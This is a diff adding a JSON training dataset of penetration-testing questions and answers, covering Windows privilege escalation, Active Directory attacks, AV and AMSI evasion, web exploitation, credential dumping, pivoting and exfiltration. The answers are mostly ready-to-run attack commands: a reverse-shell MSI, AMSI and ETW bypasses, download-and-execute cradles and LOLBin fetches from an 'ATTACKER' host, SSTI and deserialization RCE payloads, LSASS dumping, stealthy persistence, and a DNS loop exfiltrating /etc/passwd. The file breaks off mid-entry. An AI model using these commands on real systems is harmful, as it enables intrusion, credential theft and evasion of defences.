@@ -1,0 +1,392 @@
+[
+  {
+    "module_id": 38,
+    "prompt": "Describe the winPEAS enumeration process and how to interpret its output.",
+    "answer": "Run .\\winPEAS.exe > winpeas_output.txt. It colour-codes findings by severity: red/yellow indicate high-value vectors. Review System Information (OS/patch level), User Privileges (SeImpersonatePrivilege), Service Vulnerabilities (unquoted paths, weak permissions), AlwaysInstallElevated, Credentials, and Registry autoruns. Red = likely exploitable. Address red findings first before moving to yellow.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 38,
+    "prompt": "Explain the Potato attack chain for SeImpersonatePrivilege abuse.",
+    "answer": "SeImpersonatePrivilege is held by service accounts. Potato attacks (JuicyPotato, PrintSpoofer, GodPotato) abuse Windows COM server token impersonation. (1) The malicious process triggers an impersonation request. (2) Impersonates the SYSTEM token on the incoming connection. (3) Creates a child process (cmd.exe) inheriting the SYSTEM token. GodPotato works on Win10/Win11/Server 2022. Run: .\\GodPotato-NET4.exe -cmd 'cmd /c whoami' -> nt authority\\system.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 38,
+    "prompt": "How do you exploit an unquoted service path vulnerability?",
+    "answer": "(1) Find with wmic: wmic service get name,pathname | findstr /i 'auto' | findstr /i /v 'C:\\\\Windows'. (2) Confirm unquoted path e.g. C:\\Program Files\\Vulnerable App\\binary.exe. (3) Confirm write access: icacls 'C:\\Program Files\\Vulnerable'. (4) Place payload at C:\\Program.exe (or the earliest writable segment). (5) Restart the service: sc stop ServiceName; sc start ServiceName. Service starts as SYSTEM, executing payload.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 38,
+    "prompt": "Describe the AlwaysInstallElevated privilege escalation technique.",
+    "answer": "When both HKCU and HKLM registry keys AlwaysInstallElevated are set to 1, any user can install an MSI file with SYSTEM privileges. (1) Verify both keys are 1. (2) Generate MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi -o evil.msi. (3) Execute: msiexec /quiet /qn /i evil.msi. Shell returns as SYSTEM. Catch with nc -nlvp 4444.",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 38,
+    "prompt": "What credential sources should you always check after gaining initial Windows access?",
+    "answer": "1. cmdkey /list — stored Windows credentials. 2. reg query HKLM /f password /t REG_SZ /s — registry passwords. 3. C:\\Windows\\Panther\\Unattend.xml — unattend deployment files. 4. %APPDATA% and %LOCALAPPDATA% — application configs. 5. C:\\inetpub\\wwwroot\\web.config — IIS configs with connection strings. 6. Get-ChildItem -Path C:\\ -Include *.config,*.ini,*.xml -Recurse | Select-String 'password'. 7. User's browser credentials (LaZagne.exe browsers).",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 39,
+    "prompt": "What is a Golden Ticket and what does the krbtgt hash enable?",
+    "answer": "A Golden Ticket is a forged Kerberos TGT signed with the krbtgt account's NTLM hash. Since KDCs trust any TGT signed with krbtgt, the attacker can forged a ticket for any user (including non-existent ones) with any group memberships. A Golden Ticket is valid for up to 10 years (though KDCs check max lifetime). The krbtgt hash gives full persistent domain admin access until it is rotated TWICE (two resets are needed to invalidate all existing tickets).",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 39,
+    "prompt": "Explain ADCS ESC1 — what misconfiguration enables it and how to exploit it?",
+    "answer": "ESC1 (Misconfigured Certificate Templates): the template allows SAN (Subject Alternative Name) specification by the requestor AND allows Domain Authentication EKU AND is available to low-privilege users. Exploit: (1) certipy find -vulnerable to discover. (2) certipy req -u user@corp -p pass -target ca.corp -template VulnTemplate -upn administrator@corp.local -ca corp-CA. (3) Receive .pfx certificate for 'administrator'. (4) certipy auth -pfx administrator.pfx -dc-ip DC_IP -> returns NTLM hash.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 39,
+    "prompt": "How does a DCSync attack work and who can perform it by default?",
+    "answer": "DCSync simulates a Domain Controller replication request to obtain password hashes without touching LSASS on the DC. It uses the MS-DRSR protocol (GetNCChanges). By default: DCs themselves, DA group members, Domain Admins. To use: impacket-secretsdump domain/admin:pass@dc-ip -just-dc-ntlm (or Mimikatz: lsadump::dcsync /user:krbtgt). To persist: grant replication rights to a regular account: Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity luser -Rights DCSync.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 39,
+    "prompt": "Describe Shadow Credentials — what permissions does it require and how is it chained to full compromise?",
+    "answer": "Shadow Credentials abuses the msDS-KeyCredentialLink attribute on AD objects. An attacker with GenericWrite on a target object appends a crafted key credential. The target user then authenticates via PKINIT (certificate-based Kerberos) using the injected key. (1) Whisker.exe add /target:administrator — injects key credential and outputs base64 cert. (2) Rubeus.exe asktgt /user:administrator /certificate:BASE64 /password:pass /ptt — gets DA TGT. Works even with ACL as low-privilege user if GenericWrite is present. BloodHound shows GenericWrite edges.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 39,
+    "prompt": "Why should the krbtgt hash be stored off-target after DCSync, and how do you recover if locked out?",
+    "answer": "krbtgt hash enables Golden Ticket generation at any time in future, even if all other credentials are rotated. Store securely in password manager / encrypted notes off the target. If locked out: use krbtgt hash to forge Golden Ticket: impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain corp.local Administrator. Use ticket: export KRB5CCNAME=./Administrator.ccache; impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 40,
+    "prompt": "What is AMSI and how can it be bypassed in a PowerShell session?",
+    "answer": "AMSI (Antimalware Scan Interface) hooks PowerShell, .NET, and JScript runtimes to scan content for malware signatures before execution. Classic bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true). This sets amsiInitFailed to true, disabling AMSI for the current session. Must be string-concatenated or obfuscated to avoid detection of the bypass string itself: 'amsiInit' + 'Failed'.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 40,
+    "prompt": "What are LOLBins and give three examples used for payload delivery?",
+    "answer": "LOLBins (Living Off the Land Binaries) are trusted Windows binaries with functionality that can be abused for malicious purposes. Three examples: 1. certutil.exe -urlcache -split -f http://ATTACKER/file.exe file.exe — downloads files bypassing some web filters. 2. mshta.exe http://ATTACKER/payload.hta — executes HTA (HTML Application) files, which can run VBScript/JScript. 3. regsvr32.exe /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll — COM scriptlet execution, often allowed through firewall. These run as signed Microsoft binaries, bypassing application whitelisting.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 40,
+    "prompt": "Describe how to execute a PowerShell script in-memory to avoid AV detection.",
+    "answer": "In-memory execution avoids writing to disk. Method 1: IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1'). Method 2: IEX (iwr 'http://ATTACKER/script.ps1' -UseBasicParsing). Method 3 (avoids DownloadString detection): $data = (New-Object System.Net.WebClient).DownloadData('http://ATTACKER/script.ps1'); $text = [System.Text.Encoding]::UTF8.GetString($data); IEX $text. Apply AMSI bypass before any of these to prevent AMSI from scanning the downloaded content.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 40,
+    "prompt": "How do ETW (Event Tracing for Windows) patches differ from AMSI bypasses?",
+    "answer": "AMSI bypasses prevent content scanning before execution. ETW patches prevent events from being recorded in Windows event logs, reducing forensic traces for EDR correlation. ETW patch example (C#): patch the EtwEventWrite function in ntdll.dll to return immediately. In PowerShell: $a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider'); the field '_m_enabled' is patched to 0. ETW bypass means no PowerShell script block logging. Both AMSI + ETW bypass together reduce detection surface significantly.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 40,
+    "prompt": "What should you check if PowerShell is in Constrained Language Mode?",
+    "answer": "Check: $ExecutionContext.SessionState.LanguageMode — returns 'ConstrainedLanguage' if restricted. This blocks Add-Type, .NET reflection, COM objects, and AMSI bypasses. Workarounds: 1. Find a bypass for the specific AppLocker/WDAC policy version. 2. Use PowerShell version 2 (powershell -version 2) if installed — no Constrained Language. 3. Switch to cmd.exe alternatives — certutil, mshta, regsvr32. 4. Write C# executable and run from disk. 5. MSBuild.exe with inline task compilation.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 41,
+    "prompt": "How do you detect SSRF and escalate it to reading internal services?",
+    "answer": "Detection: inject http://ATTACKER/test into URL parameters, headers (Referer, Host, X-Forwarded-For), and data fields. Confirm with Burp Collaborator / interactsh DNS callback. Escalation: (1) Target http://127.0.0.1:PORT to probe internal services — common ports 8080, 8443, 9200 (Elasticsearch). (2) http://169.254.169.254/latest/meta-data/ for AWS IAM credentials. (3) Gopher:// for SSRF-to-RCE via Redis/Memcached. Filter bypass: 127.0.0.1 -> 2130706433 (decimal), http://127.0.0.1.nip.io/, http://[::1]/.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 41,
+    "prompt": "Identify the SSTI payload for Jinja2 and construct an RCE payload.",
+    "answer": "Detection: {{7*7}} returns 49 in Jinja2/Twig. Jinja2 RCE using __globals__: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Alternative: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}. Note: the subclass index varies by Python version — enumerate with: {{''.__class__.__mro__[1].__subclasses__()}} to find subprocess.Popen. If output is filtered, use OOB: os.popen('curl http://ATTACKER/?d=$(id|base64)').read().",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 41,
+    "prompt": "Explain Java deserialization exploitation workflow with ysoserial.",
+    "answer": "Workflow: (1) Detect — send ysoserial URLDNS payload (no dependencies, safe): java -jar ysoserial.jar URLDNS 'http://collaborator' | base64 -w0. Confirm with DNS callback. (2) Fingerprint classpath — look for library names in error messages or class paths. (3) Select gadget chain — CommonsCollections1-6 (Apache Commons), Spring, Groovy. (4) Create RCE payload: java -jar ysoserial.jar CommonsCollections6 'curl http://10.10.14.5/ -o /tmp/s.sh; bash /tmp/s.sh' | base64 -w0. (5) Submit as cookie/parameter where deserialization occurs.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 41,
+    "prompt": "Describe the JWT RS256 to HS256 algorithm confusion attack.",
+    "answer": "JWT algorithms: RS256 uses RSA private key (server-only) to sign, public key to verify. HS256 uses a shared secret. Confusion attack: change 'alg' header from RS256 to HS256, then sign the JWT with the server's PUBLIC RSA key (which is usually obtainable). The library treats the public key as the HS256 secret and verifies it matches — exploit succeeds if vulnerable. Tool: python jwt_tool.py TOKEN -X k -pk /path/to/public.key. Also test alg:none — remove signature entirely.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 41,
+    "prompt": "What is mass assignment and how do you test for it in web applications?",
+    "answer": "Mass assignment occurs when a framework automatically binds HTTP request parameters to object properties, including ones not intended to be user-settable (role, isAdmin, balance). Testing: (1) GET the endpoint to see the full resource structure in response. (2) Include additional fields in PUT/PATCH/POST: if API returns {id:1, name:'user', role:'user'}, send PUT with {id:1, name:'user', role:'admin'}. (3) Check response — if role changes to 'admin', vulnerable. Common in Ruby on Rails, Laravel, Spring (before @JsonIgnore), Django REST Framework without read_only_fields.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "How do you discover undocumented API endpoints during an API penetration test?",
+    "answer": "1. Documentation endpoints: /swagger, /swagger.json, /swagger-ui.html, /api-docs, /openapi.json, /graphql, /graphiql. 2. JavaScript analysis: pull all .js files with Burp suite and search for fetch('/api/', axios, endpoint strings. 3. Wordlist fuzzing: ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://target/FUZZ. 4. Mobile app reverse engineering: decompile APK with jadx, extract hardcoded endpoints. 5. JS source maps (/app.js.map) reveal original source with all endpoints.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "Explain GraphQL introspection and why it is a security risk.",
+    "answer": "Introspection is a built-in GraphQL feature returning the full schema (all types, queries, mutations, fields). A single introspection query reveals every endpoint equivalent to the entire API specification: {__schema{types{name fields{name type{name}}}}}. Security risk: reveals sensitive API surface (internal admin mutations, hidden parameters, deprecated methods). Test with Burp repeater — POST to /graphql with Content-Type: application/json. If introspection is enabled, map all queries/mutations and test each for authorization issues.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "What is BOLA (Broken Object Level Authorization) and how do you prove it?",
+    "answer": "BOLA (also called IDOR in REST context) occurs when the API uses user-controlled IDs to access objects without verifying ownership. Proof: (1) Create two accounts: userA (ID 44) and userB (ID 43). (2) As userA, send GET /api/v1/users/43 — if you receive userB's data, BOLA is confirmed. (3) Escalate: try accessing admin objects, payment records, private files. Document with: full request showing userA's auth token + request for userB's ID, full response showing userB's private data. BOLA is the #1 most critical API vulnerability.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "How do you bypass API rate limiting?",
+    "answer": "Rate limits often rely on source IP or session. Bypass techniques: 1. IP spoofing headers — X-Forwarded-For: 127.0.0.1, X-Real-IP: 127.0.0.1, True-Client-IP: 127.0.0.1 (server may trust these if improperly configured). 2. IP rotation — multiple proxies changing client IP. 3. JSON parameter pollution — {\"username\":\"user\",\"username\":[\"user\",\"user\"]} — some parsers handle arrays differently. 4. Account rotation — create multiple accounts for distributed testing. 5. Time-based: rate limits reset; burst during reset window.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "What are the key differences between testing REST APIs vs GraphQL APIs?",
+    "answer": "REST: multiple endpoints, each resource has a URL. Test each endpoint individually for auth bypass, IDOR. Verb-based (GET/POST/PUT/DELETE). GraphQL: single endpoint (/graphql), all via POST. One query language. Key differences for testing: (1) Introspection query gives full schema — skip endpoint discovery. (2) Test mutations for auth bypass (is createAdmin accessible to users?). (3) Batch attacks — send many queries in one request to bypass per-request rate limits. (4) Nested queries for DoS. (5) Same vuln categories but different discovery method.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 43,
+    "prompt": "What is a child-to-parent domain escalation and what trust property enables it?",
+    "answer": "In an AD forest, child domains (child.corp.local) trust the parent (corp.local) due to the automatic bidirectional transitive trust established during domain creation. SID filtering is DISABLED between same-forest domains by default. This means a compromised child domain with access to the child krbtgt hash can forge a Golden Ticket with the Enterprise Admins SID (S-1-5-21-ROOT_SID-519) in the ExtraSIDs field. The parent DC accepts this ticket, granting Enterprise Admin access to the root domain. One-liner to automate: impacket-raiseChild child.corp.local/admin:pass -target-exec rootdc.corp.local.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 43,
+    "prompt": "How does Unconstrained Delegation enable DA compromise through printer coercion?",
+    "answer": "Unconstrained Delegation: when set on a computer, any Kerberos ticket delegated to it includes the full TGT of the authenticating user. Exploitation: (1) Find hosts with unconstrained delegation: Get-DomainComputer -Unconstrained. If the host is not a DC but has this flag. (2) Compromise that host. (3) Coerce a DC to authenticate: SpoolSample.exe dc01.corp.local unconstrained.corp.local (abuses MS-RPRN print spool). (4) DC's TGT is cached on the compromised server. (5) Rubeus.exe dump /service:krbtgt /nowrap extracts DA TGT. (6) Rubeus.exe ptt imports it for full DA access.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 43,
+    "prompt": "Explain Constrained Delegation S4U exploitation.",
+    "answer": "Constrained Delegation allows specific services to impersonate any user to specific target services. Identified by msDS-AllowedToDelegateTo on service account. S4U2Self + S4U2Proxy: the service account requests a TGS on behalf of any user (even DA). Exploitation with Rubeus: Rubeus.exe s4u /user:svc_vuln /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/server.corp.local /ptt. This gives a TGS ticket allowing access to \\\\server.corp.local\\C$ as administrator. Verify: ls \\\\server.corp.local\\c$.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 43,
+    "prompt": "What is Resource-Based Constrained Delegation (RBCD) and how is it abused?",
+    "answer": "RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target computer determines which accounts can delegate to it. If you have GenericWrite on a computer object, you can configure this attribute. Attack: (1) Create a new computer account (up to 10 machines by default, controlled by ms-DS-MachineAccountQuota). (2) Set RBCD on target: Set-ADComputer target -PrincipalsAllowedToDelegateToAccount $FakeComputer. (3) S4U2Self+Proxy via Rubeus: impersonate administrator to CIFS/target service. Access \\\\target\\C$.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 43,
+    "prompt": "How do you enumerate trust relationships and determine attack paths?",
+    "answer": "Enumeration: Get-DomainTrustMapping (PowerView) — shows all in-forest and cross-forest trusts, direction, and type. Get-ForestTrust — forest-level trusts. BloodHound: marks trust boundaries; use custom queries to find cross-trust paths. Key factors for attack planning: 1. Trust direction (one-way vs bidirectional). 2. SID Filtering enabled (usually cross-forest) vs disabled (usually same-forest). 3. Selective Authentication (restricts which accounts can cross). 4. Transitivity (transitive = can hop through multiple domains). Document trust map for report.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 44,
+    "prompt": "Describe how to dump LSASS using comsvcs.dll and parse offline with pypykatz.",
+    "answer": "comsvcs.dll method evoids Mimikatz binary: (1) Get LSASS PID: tasklist | findstr lsass (e.g., 700). (2) Dump: rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 700 C:\\Temp\\lsass.dmp full. (3) Exfiltrate lsass.dmp to attacker. (4) Parse: pypykatz lsa minidump lsass.dmp. Output shows NTLM hashes, cleartext passwords (if WDigest enabled), Kerberos tickets. Store all hashes for lateral movement. Requires SeDebugPrivilege (usually available to local admins).",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 44,
+    "prompt": "What is Credential Guard and how does it affect LSASS dumping?",
+    "answer": "Credential Guard (Windows 10+, Server 2016+) isolates LSASS in a VBS (Virtualization Based Security) enclave so even SYSTEM cannot read NTLM hashes or Kerberos keys from LSASS memory. Mimikatz sekurlsa::logonpasswords returns empty or placeholder values. Alternatives when Credential Guard is active: (1) SAM/SYSTEM hive extraction (gives local account hashes only). (2) Kerberoasting (network-based, no LSASS needed). (3) AS-REP Roasting. (4) DCSync if DA. (5) DPAPI masterkey decryption for saved credentials.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 44,
+    "prompt": "Describe how to extract the SAM database to recover local account NTLM hashes.",
+    "answer": "SAM database stores local account NT hashes, encrypted with SYSKEY stored in SYSTEM hive. Steps: (1) reg save HKLM\\SAM C:\\Temp\\sam.hive. (2) reg save HKLM\\SYSTEM C:\\Temp\\system.hive. (3) reg save HKLM\\SECURITY C:\\Temp\\security.hive (for LSA secrets/cached domain hashes). (4) Copy to attacker. (5) impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL. Output: (local)hash format for CrackMapExec PTH. Requires local admin rights.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 44,
+    "prompt": "What persistence mechanisms should you use when you need to survive reboots discreetly?",
+    "answer": "Stealthy persistence options in order of detectability: 1. WMI Event Subscription — difficult to detect without specific tooling: $filter + $consumer + $binding for trigger on process start or schedule. 2. COM Hijacking — replace user-registered COM objects that get called by legit processes. 3. Scheduled task with obfuscated name mimicking Windows Update. 4. Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (user-level, survives logon). 5. DLL hijacking in writable app directory. Avoid HKLM run keys — high detection rate by security tools.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 44,
+    "prompt": "What does LaZagne collect and when should it be used?",
+    "answer": "LaZagne.exe is a credential harvesting tool collecting from 30+ sources: web browsers (Chrome, Firefox, IE), email clients (Thunderbird, Outlook), git config, SSH keys, Windows Credential Manager, FileZilla FTP, databases, Wifi passwords, PuTTY sessions, VPN config files, and many more. Run: .\\LaZagne.exe all -oJ -output C:\\Temp (JSON output). Most useful: on developer workstations (ssh keys, git credentials, AWS config), sysadmin desktops (PuTTY sessions with saved passwords), web servers (database connection strings in browser-stored credentials).",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 45,
+    "prompt": "What is Pass-the-Hash and which protocols support it?",
+    "answer": "Pass-the-Hash (PTH) uses an NTLM hash directly for authentication without knowing the plaintext password. The NTLM authentication protocol accepts the hash as the response to a challenge. Protocols supporting PTH: SMB (nxc smb, impacket psexec/wmiexec/smbexec), WinRM (evil-winrm -H HASH), RDP with Restricted Admin mode (xfreerdp /pth:HASH — requires Restricted Admin to be enabled), LDAP (some impacket tools). Does NOT work with: Kerberos-only environments (NTLMv2 can be disabled by policy), Credential Guard systems.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 45,
+    "prompt": "Explain the stealth difference between psexec, smbexec, and wmiexec.",
+    "answer": "impacket-psexec: uploads PSEXESVC.exe to \\ADMIN$ share, creates a named pipe service. Highest detection — service creation is logged (Event 7045). Provides interactive cmd shell. smbexec: creates a temporary service per command, executes via cmd.exe, returns output. Less artifacts than psexec but still creates services (detectable). wmiexec: uses DCOM/WMI to execute commands — no service creation, no executable dropped. Lowest detection signature. Provides semi-interactive shell. For OPSEC: wmiexec > smbexec > psexec. All produce Event 4624 (logon) on target.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 45,
+    "prompt": "How do you use nxc (netexec/crackmapexec) to test lateral movement across a subnet?",
+    "answer": "1. Bulk auth test: nxc smb 10.10.10.0/24 -u administrator -H NTLM_HASH (domain auth). For local admin: add --local-auth. 2. Look for (Pwn3d!) in output — confirms admin access on that host. 3. Execute commands: nxc smb IP -u admin -H HASH -x 'whoami /all'. 4. Dump local hashes: nxc smb IP -u admin -H HASH --sam. 5. Spray credentials across many users: nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success. 6. Check shares: nxc smb range -u user -p pass --shares. Chain: PTH -> command exec -> new creds -> repeat.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 45,
+    "prompt": "What BloodHound queries are most useful for lateral movement planning?",
+    "answer": "1. Shortest Paths to Domain Admins — shows entire attack path from owned node. 2. Find All Users with Alternative Rights to DA — non-obvious ACL paths. 3. Computers where Domain Users can RDP — quick lateral movement targets. 4. Computers with Unconstrained Delegation — coerce + TGT capture pivot points. 5. High Value Targets — all Tier 0 assets. Custom: MATCH p=shortestPath((n:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p. Mark owned nodes with right-click to enable path analysis from compromised accounts.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 45,
+    "prompt": "Explain Kerberoasting as a lateral movement enabler in a new network segment.",
+    "answer": "After pivoting to a new network segment: (1) GetUserSPNs to find Kerberoastable accounts in the new domain/subnet: impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request -output hashes.txt. (2) Crack with hashcat: hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt. (3) Service account credentials often reused on multiple systems in the same segment. (4) High-privilege service accounts (backup, HR, it-admin) become your next set of lateral movement credentials enabling another round of nxc spray.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 46,
+    "prompt": "Explain how Ligolo-ng works and why it is preferred over proxychains for internal enumeration.",
+    "answer": "Ligolo-ng creates a TUN interface on the attacker machine, making the internal network reachable as if directly connected — no proxychains needed. Tools run at full speed natively. Setup: (1) Create tun: sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up. (2) Start proxy: ./proxy -selfcert -laddr 0.0.0.0:11601. (3) Upload agent to pivot, run: .\\agent.exe -connect ATTACKER:11601 -ignore-cert. (4) In proxy console: session -> start. (5) Add route: sudo ip route add 10.10.10.0/24 dev ligolo. Now tools reach 10.10.10.0/24 directly. Proxychains limitation: TCP only, slow, breaks many tools.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 46,
+    "prompt": "How do you set up Chisel reverse SOCKS5 when outbound ports are filtered?",
+    "answer": "Chisel can use HTTP/HTTPS on ports 80/443 to bypass egress filtering. Attacker: ./chisel server -p 8080 --reverse. Pivot host: .\\chisel.exe client ATTACKER:8080 R:socks. This creates a SOCKS5 proxy reverting to attacker (listening on 127.0.0.1:1080 by default). Configure: update /etc/proxychains4.conf: socks5 127.0.0.1 1080. Use: proxychains -q nmap -sT -Pn -p 80,443,445,3389 10.10.10.50. Host port 80/443 Chisel behind nginx/apache for maximum stealth — disguises as web traffic.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 46,
+    "prompt": "Explain double pivoting — how do you access a third network segment through two compromises?",
+    "answer": "Double pivot: Attacker -> Pivot1 (DMZ) -> Pivot2 (internal) -> Target3 (restricted). Method with Ligolo-ng: (1) Deploy agent on Pivot1, start tunnel to Attacker (segment 2 accessible). (2) Route segment 2 via ligolo. (3) Route agent traffic for segment 3 through Pivot2. Chisel alternative: Attacker (port 8080 server) <- Pivot1 (R:127.0.0.1:8081:socks) -> Pivot2 (R:127.0.0.1:8082:socks via Pivot1 chain). Each hop adds a proxychains entry. Keep track of each tunnel and what segment it unlocks in your pivot diagram.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 46,
+    "prompt": "When would you use DNS tunnelling (dnscat2) and how does it work?",
+    "answer": "DNS tunnelling bypasses restrictive firewalls that only allow DNS traffic out (port 53 UDP). dnscat2 encodes C2 traffic as DNS queries/responses — data is Base32-encoded in subdomain labels of queries to the attacker-controlled DNS server. Setup: (1) Control a domain (attacker.com) and set NS record to attacker VPS. (2) Start dnscat2 server: ruby dnscat2.rb attacker.com. (3) Victim: ./dnscat2 --dns server=attacker.com --secret=PASSWORD. Limitations: very low bandwidth (a few KB/s), high latency. Use only when no other channel available. Generates DNS query volume anomalies (detectable by DNS monitoring).",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 46,
+    "prompt": "What are the key commands to verify pivot connectivity before running scans?",
+    "answer": "Before running nmap through a pivot, verify the connection: 1. proxychains curl http://10.10.10.50/ — tests HTTP connectivity through SOCKS proxy. 2. proxychains nc -zv 10.10.10.50 445 — tests TCP port availability. 3. With Ligolo: curl http://10.10.10.50/ — runs natively without proxychains. 4. Ping (ICMP): often blocked by pivots — test TCP first. 5. proxychains nmap -sT -Pn -p 22,80,443,445 10.10.10.50 -T4 -- verify one host before scanning /24. Failed connectivity = wrong route, wrong SOCKS port, or tunnel dropped. Re-establish before scanning.",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 47,
+    "prompt": "How do you discover sensitive files on Windows Active Directory shares?",
+    "answer": "Snaffler is the most effective tool: .\\Snaffler.exe -s -o snaffler.log. It reads all reachable SMB shares and ranks finds by sensitivity score (colour-coded: Red = critical, Yellow = interesting). Focuses on: .kdbx (KeePass), .ppk (PuTTY keys), .pfx (certificates), .config/.ini with passwords, SQL connection strings, Word/Excel files with 'password' in name. Manual: nxc smb RANGE --shares enumerates share names; nxc smb TARGET --spider-folder to spider content; smbclient //TARGET/share to browse interactively. Document share name, file path, and content type in findings.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 47,
+    "prompt": "What is the correct ethical approach to data exfiltration in a penetration test?",
+    "answer": "The correct approach: demonstrate access without causing harm. For a file: (1) Screenshot showing the file exists and its path. (2) Show first 2-5 lines (enough to prove content type/sensitivity). (3) Do NOT download/copy bulk PII, financial records, or trade secrets. For CPTS exam: screenshots of file listings with filenames, directory listing, or proof-of-access commands are sufficient evidence. In real engagements: clearly defined scope specifies what you're allowed to access and what to do with it. Immediately report critical data exposure to the client without retaining sensitive data.",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 47,
+    "prompt": "Describe DNS-based data exfiltration and when to use it.",
+    "answer": "DNS exfiltration encodes file data into DNS query hostnames — only DNS traffic allowed. Method: (1) Base64-encode file content. (2) Split into <=63 char chunks (DNS label limit). (3) For each chunk: nslookup CHUNK.attacker.com (or as subdomain in any query). Attacker's DNS server logs all incoming queries. Example: for chunk in $(cat /etc/passwd | base64 | fold -w 50); do dig @attacker.com ${chunk}.exfil.attacker.com +short; done. Use when: firewalls block all outbound except DNS. Slow (~5KB/min). Generates anomalous DNS volume — use for demonstration only, not for bulk exfiltration.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 47,
+    "prompt": "How do you use Snaffler and what does its output tell you?",
+    "answer": "Snaffler automatically discovers sensitive content across SMB shares from any domain-joined host. Run: .\\Snaffler.exe -s -o snaffler.log -v data. Colour coding: Red (highest) = KeePass databases, private keys, token files. Yellow = config files with credential patterns, SQL connection strings. Green = potentially interesting (scripts, backups). Blue/White = low interest. Output format: [DateTime] [Colour] {MatchRule} file path [match]. Filter results: grep -i 'red' snaffler.log. Each Red finding is a reportable credential exposure. Document file path, content preview, and access method.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 47,
+    "prompt": "What post-exploitation database commands yield the most valuable intelligence?",
+    "answer": "After compromising a database server: MySQL/MSSQL: 1. List databases: SHOW DATABASES; / SELECT name FROM sys.databases. 2. Dump user tables: SELECT username, password FROM users LIMIT 5. 3. Find app config: look for settings/config tables with API keys. 4. MSSQL xp_cmdshell: EXEC xp_cmdshell 'whoami'; (if enabled). MongoDB without auth: db.adminCommand({listDatabases:1}); db.users.find({},{'username':1,'password':1}).limit(5). Redis: KEYS * shows all keys, GET key for values. Often stores session tokens and cached credentials. Document: DB type, version, table names accessed, credential count.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 48,
+    "prompt": "How do you leverage SSRF vulnerabilities to obtain cloud IAM credentials?",
